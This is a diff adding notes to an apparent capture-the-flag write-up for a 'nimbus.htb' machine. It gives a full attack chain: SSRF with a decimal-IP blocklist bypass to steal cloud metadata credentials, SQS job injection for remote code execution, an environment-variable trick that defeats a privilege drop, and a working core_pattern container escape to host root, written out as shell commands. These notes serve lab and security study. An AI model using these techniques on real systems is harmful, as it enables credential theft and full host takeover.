@@ -42,3 +42,54 @@ sqs.list_queues()
 - Role scope: sqs:SendMessage only on nimbus-jobs
 - "floci" = internal emulator hostname at :4566 (Java/Quarkus LocalStack re-implementation)
 - Other services (s3, lambda, ec2) returned AccessDenied — nimbus-web-role is locked to sqs
+
+## SQS Job Injection -> Worker RCE
+Worker runs `yaml.load(body, Loader=yaml.Loader)` then `subprocess.run(["python3", "-c", script])`.
+- `nimbus-web-role` has `sqs:SendMessage` on `nimbus-jobs`
+- Inject a job with `script` field containing arbitrary Python → RCE as `uid=1000(worker)` in Docker container
+- No output channel from worker; exfil via HTTP POST back to attacker listener
+
+## Unauthenticated floci Admin
+IAM enforced only on `aws.nimbus.htb` proxy. Direct access to `floci:4566` from worker container:
+```python
+import boto3
+c = boto3.client("sts", endpoint_url="http://floci:4566",
+    aws_access_key_id="test", aws_secret_access_key="test")
+c.get_caller_identity()
+# -> arn:aws:iam::847219365028:root  (FULL ADMIN)
+```
+floci = Java/Quarkus LocalStack clone, reports `1.5.17`. Services: s3, sqs, ssm, secretsmanager, lambda, ecs, ec2, codebuild, eks.
+
+## Privileged CodeBuild -> core_pattern Host Escape
+floci CodeBuild honors `privilegedMode=True` → real `--privileged` Docker container.
+- Only pre-pulled image available: `floci/floci:latest`
+- Entrypoint gosu-drops to uid 1001 (CodeBuild keepalive `mkdir /codebuild` fails as non-root)
+- **Bypass:** `BASH_FUNC_id%%` env var = `() { echo uid=1000; }` → entrypoint skips drop, PID 1 = real root
+- Container has `CapEff=0x1ffffffffff` + writable `/proc/sys` (CAP_SYS_ADMIN)
+
+**core_pattern escape (host root):**
+```
+UDIR=$(sed -n 's/.*upperdir=\([^,]*\).*/\1/p' /proc/self/mountinfo | head -1)
+printf '#!/bin/sh\ncat /root/root.txt > %s/rf\n' "$UDIR" > /x.sh
+echo "|${UDIR}/x.sh" > /proc/sys/kernel/core_pattern
+ulimit -c unlimited; bash -c 'kill -11 $$'  # SIGSEGV -> host runs /x.sh as root
+```
+`core_pattern` usermode-helper runs as **host root**, copies `/root/root.txt` into container's overlay `upperdir`.
+
+## Attack Chain Summary
+```
+nmap (22,80)
+  -> POST /jobs/preview (full-read SSRF)
+  -> decimal IP 2852039166 (= 169.254.169.254) bypasses blocklist
+  -> IMDS /latest/meta-data/iam/security-credentials/nimbus-web-role
+  -> AWS creds (AccessKeyId + SecretAccessKey + Token)
+  -> sqs send-message on nimbus-jobs queue
+  -> Worker executes python3 -c <script> -> RCE as uid=1000
+  -> user.txt capture
+  -> From worker: boto3 -> floci:4566 (test/test = iam::root admin)
+  -> CodeBuild create_project(privilegedMode=true)
+  -> BASH_FUNC_id%% bypasses gosu drop -> real root in --privileged container
+  -> echo "|/x.sh" > /proc/sys/kernel/core_pattern
+  -> kill -11 (SIGSEGV) -> host kernel runs /x.sh as root
+  -> Overlay upperdir -> root.txt visible in container -> capture
+```
